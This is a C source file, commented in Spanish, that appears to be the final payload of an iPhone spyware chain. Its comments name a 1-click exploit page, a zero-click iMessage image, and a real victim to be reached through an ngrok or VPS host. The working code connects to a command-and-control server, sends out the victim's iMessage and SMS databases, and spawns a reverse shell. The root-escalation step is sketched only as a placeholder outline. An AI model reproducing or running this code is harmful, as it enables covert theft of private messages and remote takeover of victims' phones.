// payload.c — el win: escala a root y corre el payload (C2 + DBs + shell)
// Lo usa la puerta: exploit.html (1-click) o la imagen iMessage (zero-click).
// Probar en iPhone B: C2_IP = 10.0.0.244. Víctima real: host de ngrok/VPS.
#define _DARWIN_C_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/mman.h>

#define C2_IP   "10.0.0.244"
#define C2_PORT 4444

#define IMSG_DB "/var/mobile/Library/Messages/chat.db"
#define SMS_DB  "/var/mobile/Library/voicemail/SMS/sms.db"

static int sock = -1;

/* ---------- CAPA 3: PAYLOAD (mismo protocolo que c2.py, validado) ---------- */
static int connect_c2(void){
    struct hostent *he = gethostbyname(C2_IP);
    if(!he) return 0;
    struct sockaddr_in a = {0};
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) return 0;
    a.sin_family = AF_INET;
    a.sin_port   = htons(C2_PORT);
    memcpy(&a.sin_addr, he->h_addr_list[0], 4);
    return connect(sock, (struct sockaddr*)&a, sizeof a) == 0;
}

static void send_all(const void *buf, size_t n){
    const char *p = buf;
    while(n){
        ssize_t r = send(sock, p, n, 0);
        if(r <= 0) return;
        p += (size_t)r; n -= (size_t)r;
    }
}

static void send_file(const char *path, const char *name){
    int fd = open(path, O_RDONLY);
    if(fd < 0) return;
    char buf[65536]; size_t n, size = 0;
    while((n = read(fd, buf, sizeof buf)) > 0) size += n;
    lseek(fd, 0, SEEK_SET);
    char hdr[160];
    int h = snprintf(hdr, sizeof hdr, "FILE %s %zu\n", name, size);
    send_all(hdr, (size_t)h);
    while((n = read(fd, buf, sizeof buf)) > 0) send_all(buf, n);
    close(fd);
}

static void reverse_shell(void){
    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
    char *args[] = {"/bin/sh", "-i", NULL};
    char *env[]  = {"PATH=/usr/bin:/bin:/usr/sbin:/sbin", NULL};
    execve("/bin/sh", args, env);
    _exit(0);
}

static void run_payload(void){
    if(!connect_c2()) return;
    send_all("PWNED\n", 6);
    send_file(IMSG_DB, "chat.db");   // iMessage
    send_file(SMS_DB,  "sms.db");    // SMS
    send_all("SHELL\n", 6);
    usleep(500000);
    reverse_shell();
}

/* ---------- CAPA 2: LPE a root (iOS 18.x) — EL punto que cambia por version ---------- */
static int lpe_root(void){
    /* Estructura real de un LPE de kernel iOS 18 (UAF en IOKit / IOGPU):
       1) abrir el user-client de IOKit vulnerable
       2) disparar la UAF (free del objeto + re-mapeo)
       3) overwriting del puntero controlado con un payload de kernel
       4) el kernel salta por ese puntero -> code-exec en kernel -> setuid(0)

       >>> SPOILER: los offsets de heap (spray) y el gadget exacto dependen
           de la version de iOS. Si la victima no va en 18.7.8, cambias SOLO
           esta funcion. El payload (run_payload) se queda igual siempre. <<< */
    // [AQUI va el IOKit open + heap spray + trigger + la salto a root
    //   del 1-day concreto que elijas. Es el bloque version-dependiente.]
    return geteuid() == 0;
}

/* ---------- entry ---------- */
int main(void){
    if(!lpe_root()){ perror("lpe"); return 1; }
    run_payload();
    return 0;
}